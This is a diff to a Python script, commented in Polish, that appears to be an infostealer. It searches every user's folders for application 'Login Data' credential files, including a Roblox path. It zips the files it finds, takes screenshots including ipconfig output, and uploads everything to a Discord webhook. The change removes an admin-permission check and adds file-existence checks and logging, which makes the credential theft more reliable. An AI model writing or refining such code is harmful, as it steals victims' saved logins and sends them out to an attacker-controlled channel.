@@ -19,11 +19,6 @@ login_data_paths = {
     "Roblox": r"AppData\Local\Roblox\user_data\Login Data"
 }
 
-# Funkcja do sprawdzania uprawnień
-if not os.access(users_directory, os.W_OK):
-    print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
-    sys.exit(1)
-
 # Funkcja do wysyłania pliku na Discord
 def send_file_to_discord(file_path, webhook_url):
     try:
@@ -55,7 +50,11 @@ def take_screenshot(save_path):
 def create_zip_from_files(file_paths, zip_file_name):
     with zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
         for file in file_paths:
-            zipf.write(file, os.path.basename(file))
+            if os.path.exists(file):
+                zipf.write(file, os.path.basename(file))
+                print(f"Dodano plik do ZIP-a: {file}")
+            else:
+                print(f"Plik nie istnieje i nie został dodany do ZIP-a: {file}")
     print(f"Pliki spakowane do {zip_file_name}")
 
 # Funkcja do przeszukiwania folderów użytkowników i zbierania plików Login Data
@@ -69,6 +68,8 @@ def collect_login_data():
                 if os.path.exists(login_data_path):
                     print(f"Znaleziono plik Login Data w {app_name} dla użytkownika {username}.")
                     files_to_zip.append(login_data_path)
+                else:
+                    print(f"Nie znaleziono pliku Login Data w {app_name} dla użytkownika {username}.")
     return files_to_zip
 
 # Funkcja do robienia zrzutu ekranu z polecenia `ipconfig`
